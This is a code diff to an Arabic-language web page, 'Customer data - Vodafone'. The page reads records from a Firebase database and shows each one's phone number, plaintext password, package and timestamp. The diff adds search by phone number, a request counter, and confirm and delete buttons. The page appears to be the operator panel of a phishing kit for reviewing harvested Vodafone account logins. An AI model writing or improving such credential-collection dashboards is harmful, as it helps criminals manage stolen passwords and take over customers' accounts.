@@ -29,8 +29,24 @@
 
     h1 {
       text-align: center;
-      margin-bottom: 30px;
+      margin-bottom: 10px;
       font-size: 28px;
+    }
+
+    #search {
+      width: 100%;
+      padding: 10px 15px;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      border: none;
+      font-size: 16px;
+    }
+
+    #totalCount {
+      font-size: 18px;
+      margin-bottom: 15px;
+      color: #ffc1c1;
+      text-align: center;
     }
 
     .data-box {
@@ -40,11 +56,32 @@
       padding: 15px 20px;
       margin-bottom: 15px;
       box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+      position: relative;
     }
 
     .data-box p {
       margin: 5px 0;
       font-size: 15px;
+    }
+
+    .btn {
+      background-color: #ff4d4d;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      margin: 5px 5px 0 0;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 13px;
+    }
+
+    .btn:hover {
+      background-color: #cc0000;
+    }
+
+    .confirmed {
+      color: #00ff88;
+      font-weight: bold;
     }
 
     .footer {
@@ -59,6 +96,10 @@
 <body>
   <div class="container">
     <h1>بيانات العملاء - Vodafone</h1>
+
+    <input type="text" id="search" placeholder="ابحث برقم الهاتف..." />
+    <div id="totalCount">إجمالي الطلبات: 0</div>
+
     <div id="dataContainer">جاري تحميل البيانات...</div>
 
     <div class="footer">
@@ -79,28 +120,65 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
     const container = document.getElementById("dataContainer");
+    const searchInput = document.getElementById("search");
+    const totalCount = document.getElementById("totalCount");
 
-    db.ref("voda").on("value", snapshot => {
+    let allData = {};
+
+    function renderData(filter = "") {
       container.innerHTML = "";
-      const data = snapshot.val();
-      if (!data) {
-        container.innerHTML = "<p>لا توجد بيانات حالياً</p>";
+      const entries = Object.entries(allData)
+        .filter(([_, val]) => val.num.includes(filter))
+        .reverse();
+
+      totalCount.innerText = `إجمالي الطلبات: ${entries.length}`;
+
+      if (entries.length === 0) {
+        container.innerHTML = "<p>لا توجد بيانات مطابقة</p>";
         return;
       }
 
-      Object.values(data).reverse().forEach(entry => {
+      entries.forEach(([key, val]) => {
         const div = document.createElement("div");
         div.className = "data-box";
         div.innerHTML = `
-          <p><strong>الرقم:</strong> ${entry.num}</p>
-          <p><strong>كلمة المرور:</strong> ${entry.pass}</p>
-          <p><strong>الباقة:</strong> ${entry.pack}</p>
-          <p><strong>الوقت:</strong> ${entry.time}</p>
+          <p><strong>الرقم:</strong> ${val.num}</p>
+          <p><strong>كلمة المرور:</strong> ${val.pass}</p>
+          <p><strong>الباقة:</strong> ${val.pack}</p>
+          <p><strong>الوقت:</strong> ${val.time}</p>
+          ${
+            val.confirmed
+              ? '<p class="confirmed">تم تأكيد الطلب</p>'
+              : `<button class="btn" onclick="confirmEntry('${key}')">تأكيد</button>`
+          }
+          <button class="btn" onclick="deleteEntry('${key}')">حذف</button>
         `;
         container.appendChild(div);
       });
+    }
+
+    function deleteEntry(key) {
+      if (confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
+        db.ref("voda/" + key).remove().then(() => {
+          alert("تم الحذف بنجاح");
+        });
+      }
+    }
+
+    function confirmEntry(key) {
+      db.ref("voda/" + key).update({ confirmed: true }).then(() => {
+        alert("تم تأكيد الطلب");
+      });
+    }
+
+    db.ref("voda").on("value", snapshot => {
+      allData = snapshot.val() || {};
+      renderData(searchInput.value.trim());
+    });
+
+    searchInput.addEventListener("input", () => {
+      renderData(searchInput.value.trim());
     });
   </script>
 </body>
